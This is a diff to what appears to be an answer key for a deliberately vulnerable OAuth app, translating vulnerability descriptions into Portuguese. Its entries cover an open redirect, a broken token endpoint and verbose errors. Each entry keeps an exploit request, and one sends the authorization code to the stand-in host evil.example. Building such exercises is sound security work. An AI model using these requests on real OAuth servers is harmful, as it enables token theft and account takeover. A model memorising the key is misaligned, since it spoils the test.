@@ -8,7 +8,7 @@
       "class": "open-redirect",
       "severity": "high",
       "route": "/authorize",
-      "desc": "Unvalidated redirect_uri: GET /authorize does NOT check redirect_uri against the client's registered allow-list, so it issues the authorization code to ANY attacker-supplied redirect_uri (302 Location). An attacker steals the auth code/token -> account takeover.",
+      "desc": "redirect_uri sem validação: o GET /authorize NÃO confere o redirect_uri contra a lista de permissões registrada do cliente, então emite o código de autorização para QUALQUER redirect_uri fornecido pelo atacante (302 no Location). O atacante rouba o código ou o token -> tomada de conta.",
       "exploit": "GET /authorize?client_id=webapp&response_type=code&redirect_uri=http://evil.example/grab -> 302 Location: http://evil.example/grab?code=... (code sent to attacker).",
       "points": 1
     },
@@ -26,7 +26,7 @@
       "class": "auth",
       "severity": "high",
       "route": "/token",
-      "desc": "Broken OAuth token endpoint: POST /token (a) does NOT authenticate the client (client_secret is ignored), (b) accepts an authorization code issued with a PKCE code_challenge WITHOUT the code_verifier (PKCE downgrade), and (c) never invalidates the code, so the same authorization code can be redeemed repeatedly (code reuse) for multiple access tokens.",
+      "desc": "Endpoint de token OAuth quebrado: o POST /token (a) NÃO autentica o cliente (o client_secret é ignorado), (b) aceita um código de autorização emitido com code_challenge de PKCE SEM o code_verifier (downgrade de PKCE) e (c) nunca invalida o código, então o mesmo código de autorização pode ser resgatado repetidas vezes (reuso de código) por vários tokens de acesso.",
       "exploit": "POST /token grant_type=authorization_code&code=<code>&client_id=webapp (no client_secret, no code_verifier) -> access_token. Repeat the SAME code -> another access_token (reuse).",
       "points": 1
     },
@@ -35,7 +35,7 @@
       "class": "info-disc",
       "severity": "medium",
       "route": "/token",
-      "desc": "Verbose errors: a malformed request to /token (e.g. an invalid OIDC `claims` JSON) triggers a full Python traceback in the response, disclosing source paths and internals.",
+      "desc": "Erros verbosos: uma requisição malformada ao /token (por exemplo, um JSON de `claims` do OIDC inválido) dispara um traceback completo do Python na resposta, divulgando caminhos do código-fonte e detalhes internos.",
       "exploit": "POST /token grant_type=authorization_code&code=<valid>&claims=not-json -> 500 with full traceback.",
       "points": 1
     },
